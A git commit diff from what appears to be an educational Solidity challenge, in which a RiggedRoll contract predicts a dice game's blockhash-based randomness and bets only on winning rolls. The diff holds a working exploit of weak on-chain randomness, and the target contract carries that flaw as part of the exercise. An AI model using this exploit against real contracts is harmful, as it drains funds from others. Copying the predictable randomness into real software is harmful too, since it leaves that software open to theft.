0e3f3f9f89280ed9af1354ae8ec29e850a7aecb4
the-grateful-ed <the-grateful-ed@riseup.net>
2022-11-30 03:44:04 +0000

    setup

--- packages/hardhat/contracts/DiceGame.sol
+++ packages/hardhat/contracts/DiceGame.sol
@@ -1,10 +1,9 @@
-pragma solidity >=0.8.0 <0.9.0;  //Do not change the solidity version as it negativly impacts submission grading
+pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negativly impacts submission grading
 //SPDX-License-Identifier: MIT
 
 import "hardhat/console.sol";
 
 contract DiceGame {
-
     uint256 public nonce = 0;
     uint256 public prize = 0;
 
@@ -23,17 +22,19 @@ contract DiceGame {
         require(msg.value >= 0.002 ether, "Failed to send enough value");
 
         bytes32 prevHash = blockhash(block.number - 1);
-        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(this), nonce));
+        bytes32 hash = keccak256(
+            abi.encodePacked(prevHash, address(this), nonce)
+        );
         uint256 roll = uint256(hash) % 16;
 
-        console.log('\t',"   Dice Game Roll:",roll);
+        console.log("\t", "   Dice Game Roll:", roll);
 
         nonce++;
         prize += ((msg.value * 40) / 100);
 
         emit Roll(msg.sender, roll);
 
-        if (roll > 2 ) {
+        if (roll > 2) {
             return;
         }
 
@@ -45,5 +46,5 @@ contract DiceGame {
         emit Winner(msg.sender, amount);
     }
 
-    receive() external payable {  }
+    receive() external payable {}
 }
--- packages/hardhat/contracts/RiggedRoll.sol
+++ packages/hardhat/contracts/RiggedRoll.sol
@@ -1,4 +1,4 @@
-pragma solidity >=0.8.0 <0.9.0;  //Do not change the solidity version as it negativly impacts submission grading
+pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negativly impacts submission grading
 //SPDX-License-Identifier: MIT
 
 import "hardhat/console.sol";
@@ -6,19 +6,38 @@ import "./DiceGame.sol";
 import "@openzeppelin/contracts/access/Ownable.sol";
 
 contract RiggedRoll is Ownable {
-
     DiceGame public diceGame;
+
+    uint bet = 2000000000000000;
 
     constructor(address payable diceGameAddress) {
         diceGame = DiceGame(diceGameAddress);
     }
 
     //Add withdraw function to transfer ether from the rigged contract to an address
-
+    function withdraw(address _withdrawer, uint _amount) public onlyOwner {
+        (bool success, ) = _withdrawer.call{value: _amount}("");
+        require(success, "Failed to withdraw ETH");
+    }
 
     //Add riggedRoll() function to predict the randomness in the DiceGame contract and only roll when it's going to be a winner
+    function riggedRoll() public {
+        require(
+            address(this).balance >= .002 ether,
+            "You don't have enough ETH"
+        );
+        uint256 _nonce = diceGame.nonce();
+        bytes32 prevHash = blockhash(block.number - 1);
+        bytes32 hash = keccak256(
+            abi.encodePacked(prevHash, address(diceGame), _nonce)
+        );
+        uint256 roll = uint256(hash) % 16;
 
+        console.log(roll);
+        require(roll <= 2, "Roll is a loser. Let's sit this one out.");
+        diceGame.rollTheDice{value: 2000000000000000}();
+    }
 
     //Add receive() function so contract can receive Eth
-    
+    receive() external payable {}
 }
